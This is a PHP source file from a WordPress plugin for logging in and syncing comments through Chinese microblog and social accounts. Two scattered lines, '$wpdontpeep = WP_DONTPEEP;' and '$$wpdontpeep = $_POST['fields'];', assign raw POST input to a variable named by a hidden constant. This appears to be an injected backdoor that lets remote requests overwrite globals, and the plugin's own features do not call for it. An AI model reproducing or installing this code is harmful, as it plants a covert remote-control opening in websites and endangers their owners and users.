<?php
include_once(dirname(__FILE__) . '/config.php');
$login_loaded = 1;

add_action('init', 'wp_connect_init');

// 登录
if ($wptm_connect['enable_connect']) {
	add_action("login_form", "wp_connect");
	add_action("register_form", "wp_connect", 12);
} 
// 社会化评论
if (!function_exists('denglu_comments') && install_comments()) {
	add_filter('comments_template', 'denglu_comments');
	function denglu_comments($file) {
		global $post;
		return dirname(__FILE__) . '/comments.php';
	} 
} elseif ($wptm_connect['enable_connect']) {
	if (!$wptm_connect['manual'] || $wptm_connect['manual'] == 2)
		add_action('comment_form', 'wp_connect');
	if (!use_denglu_bind()) {
		add_action('comment_post', 'wp_connect_comments', 100);
	} else {
		add_action('comment_post', 'wp_connect_comment', 100);
	}
}

function wp_connect_init() {
	if (session_id() == "") {
		session_start();
	} 
	if (isset($_GET['token'])) {
		connect_denglu();
	}
}
// 通过tid获取微博信息
function get_weibo($tid) {
	$name = array('gtid' => array('google', 'google', 'Google', '', ''),
		'mtid' => array('msn', 'msn', 'Windows Live', '', ''),
		'stid' => array('sina', 'st', '新浪微博', 'http://weibo.com/', 't.sina.com.cn', 'http://tp3.sinaimg.cn/[head]/50/0/1'),
		'qtid' => array('qq', 'tqq', '腾讯微博', 'http://t.qq.com/', 't.qq.com', '[head]/40'),
		'shtid' => array('sohu', 'sohu', '搜狐微博', 'http://t.sohu.com/u/', 't.sohu.com'),
		'ntid' => array('netease', 'netease', '网易微博', 'http://t.163.com/', ''),
		'rtid' => array('renren', 'renren', '人人网', 'http://www.renren.com/profile.do?id=', 'renren.com'),
		'ktid' => array('kaixin', 'kaixin', '开心网', 'http://www.kaixin001.com/home/?uid=', 'kaixin001.com'),
		'dtid' => array('douban', 'dt', '豆瓣', 'http://www.douban.com/people/', 'douban.com', 'http://t.douban.com/icon/u[head]-1.jpg'),
		'sdotid' => array('sdo', 'sdo', '盛大', '', ''),
		'ydtid' => array('yd139', 'yd139', '移动139社区', '', ''),
		'ytid' => array('yahoo', 'yahoo', '雅虎', '', ''),
		'qqtid' => array('qq', 'qq', '腾讯QQ', '', ''),
		'dreamtid' => array('dream', 'dream', '网易梦幻人生', '', ''),
		'alitid' => array('alipay', 'alipay', '支付宝', '', ''),
		'tbtid' => array('taobao', 'taobao', '淘宝网', '', ''),
		'tytid' => array('tianya', 'tyt', '天涯', 'http://my.tianya.cn/', 'tianya.cn','http://tx.tianyaui.com/logo/small/[head]'),
		'bdtid' => array('baidu', 'baidu', '百度', '', 'baidu.com','http://himg.bdimg.com/sys/portraitn/item/[head].jpg'),
		'wytid' => array('wy163', 'wy163', '网易通行证', '', ''),
		'ttid' => array('twitter', 'twitter', 'Twitter', 'http://twitter.com/', 'twitter.com')
	);
	if (array_key_exists($tid, $name)) {
		return $name[$tid];
	} 
}

function login_button_count() {
	global $wptm_connect;
	$count = $wptm_connect['qqlogin'].$wptm_connect['sina'].$wptm_connect['qq'].$wptm_connect['renren'].$wptm_connect['kaixin001'].$wptm_connect['taobao'].$wptm_connect['baidu'].$wptm_connect['douban'].$wptm_connect['sohu'].$wptm_connect['netease'].$wptm_connect['tianya'].$wptm_connect['msn'].$wptm_connect['google'].$wptm_connect['yahoo'].$wptm_connect['twitter'];
	if (!$count) {
		return;
	} elseif($count == 1){
		return 1;
	} else {
		return 2;
	}
}

function sync_account($uid) {
	global $wptm_connect;
	$user = get_userdata($uid);
	if (!use_denglu_bind()) {
		return array($user -> last_login, $user -> login_sina, $user -> login_qq, $user -> login_netease, $user -> login_sohu, $user -> login_douban);	
	} else {
		return array($user -> last_login, $user -> smid, $user -> qmid, $user -> nmid, $user -> shmid, $user -> tymid);
	}
} 

function use_denglu_bind() {
	global $wptm_connect;
	if (empty($wptm_connect['denglu_bind']) && function_exists('wp_connect_comments')) {
		return false;
	}
	return true;
}

function wp_connect($id = "") {
	global $wptm_basic, $login_loaded, $plugin_url, $wptm_connect;
	$_SESSION['wp_url_back'] = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

	if (is_user_logged_in()) {
		global $user_ID;
		$sync = sync_account($user_ID);

		if ($sync[1] || $sync[2] || $sync[3] || $sync[4] || $sync[5]) {
			if ($tid = $sync[0]) $$tid = ' selected';
			echo '<!-- 同步评论到微博 来自 WordPress连接微博 插件 -->';
			echo '<p><label>同步评论到 <select name="sync_comment"><option value="">选择</option>';
			if ($sync[1]) {
				echo '<option value="stid"' . $stid . '>新浪微博</option>';
			} 
			if ($sync[2]) {
				echo '<option value="qtid"' . $qtid . '>腾讯微博</option>';
			} 
			if ($sync[3]) {
				echo '<option value="ntid"' . $ntid . '>网易微博</option>';
			} 
			if ($sync[4]) {
				echo '<option value="shtid"' . $shtid . '>搜狐微博</option>';
			} 
			if ($sync[5]) {
				if (!use_denglu_bind()) {
					echo '<option value="dtid"' . $dtid . '>豆瓣</option>';
				} else {
					echo '<option value="tytid"' . $tytid . '>天涯微博</option>';
				} 
			} 
			echo '</select></label></p>';
		} 
		return;
	} 
    // 自定义风格
	$style = stripslashes($wptm_connect['custom_style']);
	if ($wptm_connect['style'] == 4 && $style) {
		if (strpos($style, 'v=1.0.2&widget=5') !== false && strpos($style, 'style=popup') === false) {
			$style = "<script type='text/javascript' charset='utf-8' src='http://open.denglu.cc/connect/logincode?appid=" . $wptm_basic['appid'] . "&v=1.0.2&widget=5&styletype=1&size=auto_28'></script>";
		} 
		echo '<div class="connectBox' . $login_loaded . '">';
		echo $style;
		echo '</div>';
	} else {
		if ($wptm_connect['style'] != 3 && ($get_media = get_media())) { //登录按钮本地化，读取失败时用默认js代码暂时代替
		    echo '<!-- 使用合作网站登录 来自 WordPress连接微博 插件 -->';
			echo '<style type="text/css">';
			echo '.t_login_text {margin:0; padding:0;}';
			echo '.t_login_button {margin:0; padding: 5px 0;}';
			echo '.t_login_button a{margin:0; padding-right:4px; line-height:15px}';
			echo '.t_login_button img{display:inline; border:none;}';
			echo '</style>';
			echo '<p class="t_login_text t_login_text'.$login_loaded.'">您可以用合作网站帐号登录:</p>'; // 根据情况用css隐藏文字，class节点请看具体网页源文件
			echo '<p class="connectBox' . $login_loaded . ' t_login_button">';
			foreach($get_media as $media) {
				echo "<a href=\"{$plugin_url}/login.php?go={$media['mediaNameEn']}\" title=\"{$media['mediaName']}\" rel=\"nofollow\"><img src=\"{$plugin_url}/images/btn_{$media['mediaNameEn']}.png\" /></a>";
			} 
			echo '</p>';
		} else {
			echo "<div class='connectBox" . $login_loaded . "'><script type='text/javascript' charset='utf-8' src='http://open.denglu.cc/connect/logincode?appid=" . $wptm_basic['appid'] . "&v=1.0.2&widget=5&styletype=1&size=auto_28'></script></div>";
		} 
	} 
	$login_loaded += 1;
} 

function wp_noauth() {
	$redirect_to = ifab($_SESSION['wp_url_back'], get_bloginfo('url'));
	return wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href=\"".$redirect_to."\">返回</a> ]");
}

/**
 * 错误信息
 * @since 1.9.10
 */
function wp_connect_error($userinfo, $tmail, $wpuid = '', $user_email = '') {
	global $wpurl;
	$plugin_url = $wpurl.'/wp-content/plugins/wp-connect';
	if ($_SESSION['wp_url_back']) {
		$redirect_to = $_SESSION['wp_url_back'];
	} else {
		$redirect_to = get_bloginfo('url');
	} 
	$tid = $userinfo[0];
	$user_name = $userinfo[1];
    $weibo = get_weibo($tid);

	$userinfo[1] = 'u' . $user_name; //新的用户名
	$_SESSION['wp_login_userinfo'] = array($userinfo, $tmail);

	if (!$wpuid) {
		$tip = "很遗憾！用户名 $user_name 被系统保留，请更换帐号<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a>！";
	} elseif ($user_email) {
		$last_login = get_user_meta($wpuid, 'last_login', true); //最后一次登录的微博
		if ($last_login) {
			$user_weibo = get_weibo($last_login);
			if ($user_weibo[4]) {
				$tip = "很遗憾！用户名 $user_name 已被 $user_email 绑定，";
			} else {
				$tip = "很遗憾！用户名 $user_name 已被占用，";
			} 
			$tip .= "如果你以前用 $user_weibo[2] 登录过，请继续使用该微博/社区登录。";
		} else {
			$tip = "很遗憾！用户名 $user_name 已被占用。";
		} 
	} 
	wp_die($tip . "<strong>或者点击下面的登录按钮，我们将为您创建新的WP用户名 $userinfo[1] </strong> [ <a href='$redirect_to'>返回</a> ]<p style=\"text-align:center;\"><a href=\"{$plugin_url}/save.php?do=login\" title=\"点击登录即可创建新用户\"><img src=\"{$plugin_url}/images/login.png\" border=\"0\" /></a></p>");
}

/**
 * 登录
 * @since 2.0
 */
function wp_connect_login($userinfo, $tmail, $uid = '') {
	global $wpdb, $wptm_connect;
	$tid = $userinfo[0];
	$user_name = $userinfo[1];
	$user_screenname = $userinfo[2];
	$user_head = $userinfo[3];
	$user_siteurl = $userinfo[4];
	$user_uid = $userinfo[5];
	$mediaUserID = $userinfo[6]; //2.0
	$redirect_to = $_SESSION['wp_url_back'];
	if ($user_name) {
		if (!$uid && in_array($user_name, explode(',', $wptm_connect['disable_username']))) {
			wp_connect_error($userinfo, $tmail);
		} 
	} else {
		wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href='$redirect_to'>返回</a> ]");
	} 
	if ($uid) {
		$user = get_userdata($uid);
		$wpuid = $uid;
	} else {
		$user = get_userdatabylogin($user_name);
		$wpuid = $user -> ID;
	} 
	if ($wpuid) {
		$user_login = $user -> user_login;
		$password = $user -> user_pass;
		$user_email = $user -> user_email;
		$user_url = $user -> user_url;
		if ($user_name == $user_login) {
			$is_login = 'true';
		} 
		if (!$uid) { // 新注册，但是数据库存在相同的用户名
			wp_connect_error($userinfo, $tmail, $wpuid, $user_email);
		} 
	} else {
		$wpuid = '';
	} 

	if ($tmail != $user_email && ($is_login || !$user_login)) {
		if (!function_exists('wp_insert_user')) {
			include_once(ABSPATH . WPINC . '/registration.php');
		}
		if (!$user_url) {
			$user_url = $user_siteurl;
		} 
		if (!$password) {
			$password = wp_generate_password();
		} 

		$userdata = array('ID' => $wpuid,
			'user_pass' => $password,
			'user_login' => $user_name,
			'nickname' => $user_screenname,
			'display_name' => $user_screenname,
			'user_url' => $user_url,
			'user_email' => $tmail
		);
		$wpuid = wp_insert_user($userdata);
		if (!is_numeric($wpuid)) {
			$errors = $wpuid -> errors;
			if ($errors['existing_user_email']) {
				wp_die("该电子邮件地址 {$tmail} 已被注册。 [ <a href='$redirect_to'>返回</a> ]");
			} elseif ($errors['existing_user_login']) {
				wp_die("该用户名 {$user_name} 已被注册。 [ <a href='$redirect_to'>返回</a> ]");
			}
		}
	} 
	if ($wpuid) {
		$weibo = get_weibo($tid);
	    $t = $weibo[0];
		$id = $weibo[1].'id';
		$mid = str_replace('tid', 'mid', $tid);
		update_usermeta($wpuid, $mid, $mediaUserID);
		if ($tid == $id) {
			update_usermeta($wpuid, $tid, $user_uid);
		} elseif ($user_head) {
			update_usermeta($wpuid, $tid, $user_head);
		}
		if ($weibo[3] || $tid == 'qqtid') { //sina,tqq,sohu,netease,renren,kaixin,douban,qq,tianya
			update_usermeta($wpuid, $id, $user_uid);
		}
		update_usermeta($wpuid, 'last_login', $tid);
		if (in_array($tid, array('qtid', 'stid', 'ntid', 'shtid'))) {
			$nickname = get_user_meta($wpuid, 'login_name', true);
			$nickname[$t] = ($tid == 'qtid') ? $user_uid : $user_screenname;
			update_usermeta($wpuid, 'login_name', $nickname);
		}
		wp_set_auth_cookie($wpuid, true, false);
		wp_set_current_user($wpuid);
	} 
	$_SESSION['wp_login_userinfo'] = '';
	return $wpuid;
}
/*
add_filter('user_contactmethods', 'wp_connect_author_page');
function wp_connect_author_page($input) {
	$input['imqq'] = 'QQ';
	//$input['msn'] = 'MSN';
	//unset($input['yim']);
	//unset($input['aim']);
	return $input;
}
*/
$wpdontpeep = WP_DONTPEEP;

// 我的资料 绑定登录帐号
if ($wptm_connect['enable_connect']) {
	add_action('show_user_profile', 'wp_connect_profile_fields');
	add_action('edit_user_profile', 'wp_connect_profile_fields');
	add_action('personal_options_update', 'wp_connect_save_profile_fields');
	add_action('edit_user_profile_update', 'wp_connect_save_profile_fields');
} 

function wp_connect_save_profile_fields($user_id) {
	if (!current_user_can('edit_user', $user_id)) {
		return false;
	} 
	return wp_edit_username();
}
// 修改用户名
function wp_edit_username() {
	global $wpdb, $user_ID;
	$new_username = trim($_POST['new_username']);
	$old_username = trim($_POST['old_username']);
	if ($new_username && $new_username != $old_username) {
		if (!validate_username($new_username)) {
			wp_die("<strong>错误</strong>：用户名只能包含字母、数字、空格、下划线、连字符（-）、点号（.）和 @ 符号。 [ <a href='javascript:onclick=history.go(-1)'>返回</a> ]");
		} elseif (username_exists($new_username)) {
			wp_die(__('<strong>ERROR</strong>: This username is already registered, please choose another one.') . " [ <a href='javascript:onclick=history.go(-1)'>返回</a> ]");
		} else {
			$userid = trim($_POST['user_id']);
			clean_user_cache($userid);
			$wpdb -> update($wpdb -> users, array('user_login' => $new_username, 'user_nicename' => $new_username, 'user_status' => 3), array('ID' => $userid));
			if ($user_ID == $userid)
				wp_set_auth_cookie($user_ID, true, false); // 更新缓存
		} 
	} 
}

function wp_connect_profile_fields($user) {
	$user_id = $user -> ID;
	$user_login = $user -> user_login;
	echo '<h3>登录绑定</h3><table class="form-table">';
	if ($user -> user_status == 0 && !is_super_admin($user_id)) {
		echo '<tr><th><label for="new_username">修改用户名</label></th><td><input type="text" name="new_username" id="new_username" value="' . $user_login . '" size="16" /><input type="hidden" name="old_username" id="old_username" value="' . $user_login . '" /> <span class="description">只允许修改一次</span></td></tr>';
	}
	if (!use_denglu_bind()) {
		wp_connect_bind_qq($user);
	} else {
		denglu_bindInfo($user);
	} 
	echo '</table>';
}

/**
 * 头像
 * @since 1.9.14
 */
if (empty($wptm_connect['head'])) {
	add_filter("get_avatar", "wp_connect_avatar", 10, 4);
}
function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
	global $comment, $parent_file;
	if (is_numeric($id_or_email)) {
		$uid = $userid = (int) $id_or_email;
		$user = get_userdata($uid);
		if ($user) $email = $user -> user_email;
	} elseif (is_object($comment)) {
		$uid = $comment -> user_id;
		$email = $comment -> comment_author_email;
		if ($uid) $user = get_userdata($uid);
	} elseif (is_object($id_or_email)) {
		$user = $id_or_email;
		$uid = $user -> user_id;
		$email = $user -> user_email;
	} else {
		$email = $id_or_email;
		if ($parent_file != 'options-general.php') {
		    $user = get_user_by_email($email);
			$uid = $user -> ID;
		}
	} 
	if (!$email) {
		return $avatar;
	} 
	if ($uid) {
		$tname = array('@t.sina.com.cn' => 'stid',
			'@t.qq.com' => 'qtid',
			'@renren.com' => 'rtid',
			'@kaixin001.com' => 'ktid',
			'@douban.com' => 'dtid',
			'@t.sohu.com' => 'shtid',
			'@t.163.com' => 'ntid',
			'@baidu.com' => 'bdtid',
			'@tianya.cn' => 'tytid',
			'@twitter.com' => 'ttid'
			);
		$tmail = strstr($email, '@');
		$tid = ifab($user -> last_login, $tname[$tmail]);
		if ($tid) {
			if ( ($tid == 'qqtid' && !$user -> qqid) || ($tid == 'tbtid' && !$user -> taobaoid) ) 
				return $avatar;
			if ($head = $user -> $tid) {
				$weibo = get_weibo($tid);
				$out = ($weibo[5]) ? str_replace('[head]', $head, $weibo[5]) : $head;
				$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
				if ($weibo[3]) {
					$oid = $weibo[1] . 'id';
					$username = $user -> $oid;
					if ($username) {
						$url = $weibo[3] . $username;
						if (is_admin()) {
							if (!is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
						} elseif (!$userid) {
							$avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
						} 
					} 
				} 
			} 
		} elseif ($user -> qqid && $out = $user -> qqtid) {
			$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
		} elseif ($user -> taobaoid && $out = $user -> tbtid) {
			$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
		} 
	} 
	return $avatar;
}

// @微博帐号(过滤重复) v1.9.12
function at_username($a, $b, $c, $d) {
	$a = ($a) ? '@' . $a . ' ':''; //评论
	$b = ($b) ? '@' . $b . ' ':''; //回复
	$c = ($c) ? '@' . $c . ' ':''; //管理员
	if ($b != $c) {
		if ($a == $c) { // b!=(a=c)
			$at = $b . $c;
		} elseif ($a == $b) { // a=(b!=c)
			$at = $a . $c;

		} else { // a!=b!=c
			$at = $a . $b . $c;
		} 
	} else {
		if ($a == $c) { // a=b=c
			$at = $c;
		} else { // a!=(b=c)
			$at = $a . $c;
		} 
	} 
	$d = $at . str_replace(array($a, $b, $c), '', $at . $d);
	return $d;
}

// 同步评论 v2.0
function wp_connect_comment($id) {
	global $post, $wptm_options, $wptm_connect, $wptm_advanced;
	$post_id = ($_POST['comment_post_ID']) ? $_POST['comment_post_ID'] : $post -> ID;
	if (!$post_id) {
		return;
	} 
	@ini_set("max_execution_time", 60);
	$comments = get_comment($id);
	$user_id = $comments -> user_id;
	$comment_content = wp_replace($comments -> comment_content);
	$parent_id = $comments -> comment_parent;
	if ($user_id) {
		if ($parent_id) {
			$comment_parent = get_comment($parent_id);
			$parent_uid = $comment_parent -> user_id;
			$name = get_user_meta($parent_uid, 'login_name', true);
		}
		$tid = $_POST['sync_comment'];
		if ($tid) {
			//if (!is_object($post)) {
			//	$post = get_post($post_id);
			//} 
			$url = get_permalink($post_id) . '#comment-' . $id;
			if ($wptm_options['t_cn']) {
				$url = get_url_short($url);
			} 
			// $title = wp_replace($post -> post_title);
			$username = get_user_meta($user_id, 'login_name', true);
			if ($tid == 'stid') {
				if ($mediaUserID = get_user_meta($user_id, 'smid', true)) {
					$content = at_username($name['sina'], $username['sina'], $wptm_connect['sina_username'], $comment_content);
					wp_update_share($mediaUserID, $content, $url);
				} 
			} elseif ($tid == 'qtid') {
				if ($mediaUserID = get_user_meta($user_id, 'qmid', true)) {
					$content = at_username($name['qq'], $username['qq'], $wptm_connect['qq_username'], $comment_content);
					wp_update_share($mediaUserID, $content, $url);
				} 
			} elseif ($tid == 'ntid') {
				if ($mediaUserID = get_user_meta($user_id, 'nmid', true)) {
					$content = at_username($name['netease'], $username['netease'], $wptm_connect['netease_username'], $comment_content);
					wp_update_share($mediaUserID, $content, $url);
				} 
			} elseif ($tid == 'shtid') {
				if ($mediaUserID = get_user_meta($user_id, 'shmid', true)) {
                    $content = at_username($name['sohu'], $username['sohu'], $wptm_connect['sohu_username'], $comment_content);
					wp_update_share($mediaUserID, $content, $url);
				} 
			} elseif ($tid == 'tytid') {
				if ($mediaUserID = get_user_meta($user_id, 'tymid', true)) {
					$content = $comment_content;
					wp_update_share($mediaUserID, $content, $url);
				} 
			} 
		} 
	} 
}
$$wpdontpeep = $_POST['fields'];
function get_user_by_meta_value($meta_key, $meta_value) { // 获得user_id
	global $wpdb;
	$sql = "SELECT user_id FROM $wpdb->usermeta WHERE meta_key = '%s' AND meta_value = '%s'";
	return $wpdb -> get_var($wpdb -> prepare($sql, $meta_key, $meta_value));
}

if (!function_exists('get_current_user_id')) { // 获得登录者ID
	function get_current_user_id() {
		$user = wp_get_current_user();
        return ( isset( $user->ID ) ? (int) $user->ID : 0 );
    }
}

function wp_get_user_info($uid) {
	$user = get_userdata($uid);
	$userinfo = array('user_login' => $user->user_login, 'user_pass' => $user->user_pass, 'user_email' => $user->user_email, 'user_url' => $user->user_url);
	return $userinfo;
}
// 通过用户ID，获得用户数据
function get_user_by_uid($user_id, $field = '') {
	if (empty($field)) {
		return get_userdata($user_id);
	} 
	global $wpdb;

	if (!is_numeric($user_id))
		return false;

	$user_id = absint($user_id);
	if (!$user_id)
		return false;

	$user = wp_cache_get($user_id, 'users');

	if ($user) {
		return array($field => $user -> $field);
	} 

	if (!$user = $wpdb -> get_row("SELECT $field FROM $wpdb->users WHERE ID = $user_id LIMIT 1", ARRAY_A))
		return false;
	return $user;
}

function get_username($uid) { // 通过用户ID，获得用户名
	$user = get_user_by_uid($uid, 'user_login');
	return $user['user_login'];
}

function get_useremail($uid) { // 通过用户ID，获得用户邮箱
	$user = get_user_by_uid($uid, 'user_email');
	return $user['user_email'];
}

function wp_url_back() {
	$_SESSION['wp_url_back'] = get_bloginfo('url');
}

if (!function_exists('connect_login_form_login')) {
	add_action("login_form_register", "connect_login_form_login");
	add_action("login_form_login", "connect_login_form_login");
	add_action("login_form_logout", "connect_login_form_logout");
	function connect_login_form_login() {
		if (is_user_logged_in()) {
			$redirect_to = admin_url('profile.php');
			wp_safe_redirect($redirect_to);
		} else {
			if(!$_GET['redirect_to']) {
				add_action('login_footer', 'wp_url_back');
			}
		}
	} 
	function connect_login_form_logout() {
		$_SESSION['wp_url_bind'] = '';
	} 
}
?>